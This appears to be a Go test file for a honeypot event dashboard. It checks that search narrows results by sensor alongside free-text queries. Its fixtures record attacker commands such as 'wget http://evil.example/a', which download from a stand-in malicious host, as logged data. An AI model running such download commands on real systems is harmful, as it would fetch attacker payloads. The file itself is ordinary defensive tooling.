package main

import (
	"testing"
)

// #280: /search gained structured narrowing (filter, same shape /events
// uses) alongside its existing free-text query.

func commandHits(page searchPage) []searchHit {
	for _, g := range page.Groups {
		if g.Title == "Executed commands" {
			return g.Hits
		}
	}
	return nil
}

func TestSearchDataAppliesFilterAlongsideFreeText(t *testing.T) {
	s := &store{events: []storedEvent{
		{SrcIP: "203.0.113.1", Sensor: "cowrie", Command: "wget http://evil.example/a", Time: "2026-08-01 01:00"},
		{SrcIP: "203.0.113.2", Sensor: "dionaea", Command: "wget http://evil.example/b", Time: "2026-08-01 01:01"},
	}}
	unfiltered := s.searchData("evil.example", filter{})
	if hits := commandHits(unfiltered); len(hits) != 2 {
		t.Fatalf("expected both distinct commands to match unfiltered, got %+v", hits)
	}

	narrowed := s.searchData("evil.example", filter{sensor: "cowrie"})
	hits := commandHits(narrowed)
	if len(hits) != 1 || hits[0].Label != "wget http://evil.example/a" {
		t.Fatalf("sensor filter did not narrow the free-text search, got %+v", hits)
	}
	if len(narrowed.Filters) != 1 || narrowed.Filters[0] != "sensor = cowrie" {
		t.Fatalf("expected a sensor filter chip, got %+v", narrowed.Filters)
	}
}

func TestQuickSearchStaysUnfilteredByDesign(t *testing.T) {
	s := &store{events: []storedEvent{
		{SrcIP: "203.0.113.1", Sensor: "cowrie", Command: "wget http://evil.example/x", Time: "2026-08-01 01:00"},
		{SrcIP: "203.0.113.2", Sensor: "dionaea", Command: "wget http://evil.example/x", Time: "2026-08-01 01:01"},
	}}
	hits := s.quickSearchResults("evil.example")
	if len(hits) == 0 {
		t.Fatal("expected quick search to still return hits from both sensors, got none")
	}
}
